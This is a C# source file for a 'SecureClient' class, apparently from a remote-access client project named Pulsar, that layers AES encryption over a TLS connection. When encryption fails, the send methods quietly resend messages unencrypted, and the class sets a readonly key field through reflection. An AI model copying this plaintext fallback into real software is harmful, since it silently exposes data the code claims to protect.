using Pulsar.Common.Cryptography;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Diagnostics;
using System.Net;
using System.Security.Cryptography.X509Certificates;

namespace Pulsar.Client.Networking
{
    /// <summary>
    /// A client wrapper that adds AES encryption on top of TLS for pseudo End-to-End encryption
    /// </summary>
    public class SecureClient : Client
    {
        private readonly Aes256 _aesEncryption;
        private bool _encryptionEnabled;

        /// <summary>
        /// Event fired when encryption/decryption errors occur
        /// </summary>
        public event EventHandler<string> EncryptionError;

        /// <summary>
        /// Gets whether AES encryption is currently enabled
        /// </summary>
        public bool EncryptionEnabled => _encryptionEnabled;

        /// <summary>
        /// Initializes a new instance of the SecureClient class
        /// </summary>
        /// <param name="serverCertificate">The server certificate for TLS</param>
        /// <param name="aesKey">The AES key for encryption (if null, encryption will be disabled)</param>
        public SecureClient(X509Certificate2 serverCertificate, string aesKey = null) : base(serverCertificate)
        {
            if (!string.IsNullOrEmpty(aesKey))
            {
                try
                {
                    _aesEncryption = new Aes256(aesKey);
                    _encryptionEnabled = true;
                }
                catch (Exception ex)
                {
                    OnEncryptionError($"Failed to initialize AES encryption: {ex.Message}");
                    _encryptionEnabled = false;
                }
            }
            else
            {
                _encryptionEnabled = false;
            }

            ClientRead += OnClientRead;
        }

        /// <summary>
        /// Creates a SecureClient with automatic key management
        /// </summary>
        /// <param name="serverCertificate">The server certificate for TLS</param>
        /// <param name="keyDirectory">Directory containing the KEY.txt file (optional)</param>
        /// <returns>A configured SecureClient instance</returns>
        public static SecureClient CreateWithManagedKey(X509Certificate2 serverCertificate, string keyDirectory = null)
        {
            try
            {
                string aesKey = AesKeyManager.EnsureKeyExists(keyDirectory);
                return new SecureClient(serverCertificate, aesKey);
            }
            catch (Exception ex)
            {
                var client = new SecureClient(serverCertificate);
                client.OnEncryptionError($"Failed to load AES key, encryption disabled: {ex.Message}");
                return client;
            }
        }

        /// <summary>
        /// Connects to the specified server with optional AES key loading
        /// </summary>
        /// <param name="ip">Server IP address</param>
        /// <param name="port">Server port</param>
        /// <param name="keyDirectory">Directory containing KEY.txt (optional)</param>
        public void ConnectSecure(IPAddress ip, ushort port, string keyDirectory = null)
        {
            if (!_encryptionEnabled && _aesEncryption == null)
            {
                try
                {
                    string aesKey = AesKeyManager.EnsureKeyExists(keyDirectory);
                    var newAes = new Aes256(aesKey);
                    typeof(SecureClient).GetField("_aesEncryption", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance)?.SetValue(this, newAes);
                    _encryptionEnabled = true;
                }
                catch (Exception ex)
                {
                    OnEncryptionError($"Could not load AES key for secure connection: {ex.Message}");
                }
            }

            Connect(ip, port);
        }

        /// <summary>
        /// Sends a message with AES encryption if enabled
        /// </summary>
        /// <typeparam name="T">The type of the message</typeparam>
        /// <param name="message">The message to send</param>
        public new void Send<T>(T message) where T : IMessage
        {
            if (message == null) return;

            try
            {
                if (_encryptionEnabled && _aesEncryption != null && !(message is AesEncryptedMessage))
                {
                    var encryptedMessage = new AesEncryptedMessage(message, _aesEncryption);
                    base.Send(encryptedMessage);
                    Debug.WriteLine("We sent encrypted :sunglasses: " + encryptedMessage.EncryptedData.Length + " bytes");
                }
                else
                {
                    base.Send(message);
                    Debug.WriteLine("We sent unencrypted :sad_face: " + message.GetType().Name);
                }
            }
            catch (Exception ex)
            {
                OnEncryptionError($"Failed to encrypt message: {ex.Message}");
                Debug.WriteLine("We somehow didn't encrypt ts :sob: " + ex.Message);
                base.Send(message);
            }
        }

        /// <summary>
        /// Sends a message with AES encryption if enabled (blocking)
        /// </summary>
        /// <typeparam name="T">The type of the message</typeparam>
        /// <param name="message">The message to send</param>
        public new void SendBlocking<T>(T message) where T : IMessage
        {
            if (message == null) return;

            try
            {
                if (_encryptionEnabled && _aesEncryption != null && !(message is AesEncryptedMessage))
                {
                    var encryptedMessage = new AesEncryptedMessage(message, _aesEncryption);
                    base.SendBlocking(encryptedMessage);
                    Debug.WriteLine("We sent encrypted asf");
                }
                else
                {
                    Debug.WriteLine("We sent unencrypted asf");
                    base.SendBlocking(message);
                }
            }
            catch (Exception ex)
            {
                OnEncryptionError($"Failed to encrypt message: {ex.Message}");
                base.SendBlocking(message);
            }
        }

        /// <summary>
        /// Handles incoming messages, decrypting AES encrypted messages
        /// </summary>
        private void OnClientRead(Client sender, IMessage message, int messageLength)
        {
            if (message is AesEncryptedMessage encryptedMessage && _encryptionEnabled && _aesEncryption != null)
            {
                try
                {
                    if (!encryptedMessage.IsTimestampValid())
                    {
                        OnEncryptionError("Received message with invalid timestamp (possible replay attack)");
                        return;
                    }

                    IMessage decryptedMessage = encryptedMessage.DecryptMessage(_aesEncryption);
                    
                    var baseMethod = typeof(Client).GetMethod("OnClientRead", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
                    baseMethod?.Invoke(this, new object[] { decryptedMessage, messageLength });
                }
                catch (Exception ex)
                {
                    OnEncryptionError($"Failed to decrypt received message: {ex.Message}");
                }
            }
            else if (!(message is AesEncryptedMessage))
            {

            }
        }

        /// <summary>
        /// Enables or disables AES encryption
        /// </summary>
        /// <param name="enabled">Whether to enable encryption</param>
        /// <param name="keyDirectory">Directory to load key from (optional)</param>
        public void SetEncryptionEnabled(bool enabled, string keyDirectory = null)
        {
            if (enabled && _aesEncryption == null)
            {
                try
                {
                    string aesKey = AesKeyManager.EnsureKeyExists(keyDirectory);
                    var newAes = new Aes256(aesKey);
                    typeof(SecureClient).GetField("_aesEncryption", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance)?.SetValue(this, newAes);
                }
                catch (Exception ex)
                {
                    OnEncryptionError($"Failed to enable encryption: {ex.Message}");
                    return;
                }
            }
            
            _encryptionEnabled = enabled && _aesEncryption != null;
        }

        /// <summary>
        /// Fires the encryption error event
        /// </summary>
        private void OnEncryptionError(string errorMessage)
        {
            EncryptionError?.Invoke(this, errorMessage);
        }

        /// <summary>
        /// Disposes of resources including AES encryption
        /// </summary>
        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {

            }
            base.Dispose(disposing);
        }
    }
}
